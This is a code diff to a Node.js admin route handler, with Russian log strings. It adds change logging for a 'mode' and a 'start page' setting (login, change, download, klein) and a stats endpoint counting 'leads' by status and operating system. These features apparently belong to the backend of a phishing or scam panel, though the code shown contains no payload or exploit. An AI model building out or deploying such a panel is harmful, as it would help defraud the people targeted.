@@ -6,7 +6,7 @@ const { spawn, spawnSync } = require('child_process');
 const { execSync } = require('child_process');
 const yauzl = require('yauzl');
 const { send, safeEnd } = require('../utils/httpUtils');
-const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
+const { checkAdminAuth } = require('../utils/authUtils');
 const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
 const leadService = require('../services/leadService');
 const automationService = require('../services/automationService');
@@ -101,8 +101,13 @@ async function handle(scope) {
       try { json = JSON.parse(body || '{}'); } catch {}
       const mode = json.mode === 'manual' ? 'manual' : (json.mode === 'auto' ? 'auto' : undefined);
       const autoScript = json.autoScript !== undefined ? !!json.autoScript : undefined;
+      const before = readModeData();
       writeMode(mode, autoScript);
       const data = readModeData();
+      logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
+        'POST /api/mode: было mode=' + before.mode + ' autoScript=' + before.autoScript
+          + ' → стало mode=' + data.mode + ' autoScript=' + data.autoScript,
+        '');
       send(res, 200, { ok: true, mode: data.mode, autoScript: data.autoScript });
     });
     return true;
@@ -122,10 +127,29 @@ async function handle(scope) {
       try { json = JSON.parse(body || '{}'); } catch {}
       const sp = json.startPage != null ? String(json.startPage).trim().toLowerCase() : '';
       const value = sp === 'login' ? 'login' : sp === 'change' ? 'change' : sp === 'download' ? 'download' : sp === 'klein' ? 'klein' : 'login';
+      const beforeSp = readStartPage();
       writeStartPage(value);
+      logTerminalFlow('РЕЖИМ', 'Админка', '—', '—',
+        'POST /api/start-page: было «' + beforeSp + '» → стало «' + value + '» (Login|Change|Download|Klein)',
+        '');
       send(res, 200, { ok: true, startPage: value });
     });
     return true;
+  }
+
+  if (pathname === '/api/stats' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const rawPeriod = parsed && parsed.query ? parsed.query.period : 'today';
+    const period = ['today', 'yesterday', 'week', 'month', 'all'].includes(String(rawPeriod || '').toLowerCase())
+      ? String(rawPeriod).toLowerCase()
+      : 'today';
+    const stats = leadService.getStatsByPeriod(period);
+    return send(res, 200, {
+      ok: true,
+      period,
+      byStatus: stats.byStatus || { error: 0, pending: 0, success: 0 },
+      byOs: stats.byOs || { windows: 0, macos: 0, android: 0, ios: 0, other: 0 }
+    });
   }
 
   if (pathname === '/api/config/download' && req.method === 'GET') {
